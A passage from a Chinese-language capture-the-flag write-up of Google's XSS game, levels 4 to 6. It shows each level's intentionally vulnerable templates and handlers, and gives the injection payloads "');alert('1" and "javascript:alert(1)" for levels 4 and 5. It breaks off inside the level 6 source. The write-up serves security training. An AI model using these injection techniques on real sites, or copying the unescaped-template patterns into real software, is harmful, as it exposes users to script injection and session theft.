punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timer<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timer<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Create timer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'timer'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># Show main timer page</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token comment"># Show the results page</span>      timer<span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'timer'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'timer.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token string">'timer'</span> <span class="token punctuation">:</span> timer <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Timer.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">function</span> <span class="token function">startTimer</span><span class="token punctuation">(</span><span class="token parameter">seconds</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        seconds <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           window<span class="token punctuation">.</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"Time is up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          window<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> seconds <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level4.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/loading.gif<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">startTimer</span><span class="token punctuation">(</span><span class="token string">'&#123;&#123; timer &#125;&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>关键代码</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/loading.gif<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">startTimer</span><span class="token punctuation">(</span><span class="token string">'&#123;&#123; timer &#125;&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/></span></span></code></pre><p>默认3秒<code>seconds = parseInt(seconds) || 3;</code></p><p>输入100，看到加载如下</p><p><code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;100&#39;);&quot;&gt;</code></p><p>于是想办法闭合，用单引号闭合<code>startTimer</code>，然后写弹窗再和后面的<code>&#39;)</code>闭合</p><blockquote><p>onload 事件会在页面或图像加载完成后立即发生</p></blockquote><p>Payload:</p><pre class="language-none"><code class="language-none">&#39;);alert(&#39;1</code></pre><p>即变为<code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;&#39;);alert(&#39;1&#39;);&quot;&gt;</code></p><img src="/article/xss/image-20210424152557697.png" class="" title="level4-1" loading="lazy"><img src="/article/xss/image-20210424152620652.png" class="" title="level4-2" loading="lazy"><hr><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p><a href="https://xss-game.appspot.com/level5/frame#">https://xss-game.appspot.com/level5/frame#</a></p><p>源码·confirm.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    Thanks for signing up, you will be redirected soon...    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'&#123;&#123; next &#125;&#125;'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token comment"># Route the request to the appropriate template</span>    <span class="token keyword">if</span> <span class="token string">"signup"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'signup.html'</span><span class="token punctuation">,</span>         <span class="token punctuation">&#123;</span><span class="token string">'next'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'next'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token string">"confirm"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'confirm.html'</span><span class="token punctuation">,</span>         <span class="token punctuation">&#123;</span><span class="token string">'next'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'next'</span><span class="token punctuation">,</span> <span class="token string">'welcome'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'welcome.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Signup.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- We're ignoring the email, but the poor user will never know! --></span>    Enter email: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>reader-email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; next &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Next >><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Welcome.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Welcome! Today we are announcing the much anticipated<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/level5/frame/signup?next=confirm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Sign up<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>     for an exclusive Beta.  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>关键代码</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; next &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Next >><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p>直接讲next参数填入html，href也是可以执行JavaScript代码的</p><p>payload：</p><pre class="language-none"><code class="language-none">next&#x3D;javascript:alert(1);</code></pre><p>然后点<code>Next&gt;&gt;</code>就行</p><img src="/article/xss/image-20210424163533941.png" class="" title="level5-1" loading="lazy"><img src="/article/xss/85F04A35-370A-4FD5-9526-C80E89A2546A.png" class="" title="level5-2" loading="lazy"><blockquote><p>超链接标签<code>&lt;a&gt;</code>,用户点击相应按钮时可以跳转到新的页面（执行某个JavaScript），用到了这样的代码结构：</p><p><code>&lt;a href=&#39;javascript:doSomething()&#39;&gt;...&lt;/a&gt;</code></p><p>执行权首先落在doSomething()函数，若存在返回值则将返回值返给超链接进行合成</p></blockquote><hr><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p><a href="https://xss-game.appspot.com/level6/frame#/static/gadget.js">https://xss-game.appspot.com/level6/frame#/static/gadget.js</a></p><p>源码·index.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">function</span> <span class="token function">setInnerText</span><span class="token punctuation">(</span><span class="token parameter">element<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>element<span class="token punctuation">.</span>innerText<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        element<span class="token punctuation">.</span>innerText <span class="token operator">=</span> value<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        element<span class="token punctuation">.</span>textContent <span class="token operator">=</span> value<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">function</span> <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> scriptEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// This will totally prevent us from loading evil URLs!</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token string">"Sorry, cannot load a URL containing \"http\"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token comment">// Load this awesome gadget</span>      scriptEl<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>       <span class="token comment">// Show log messages</span>      scriptEl<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"Loaded gadget from "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      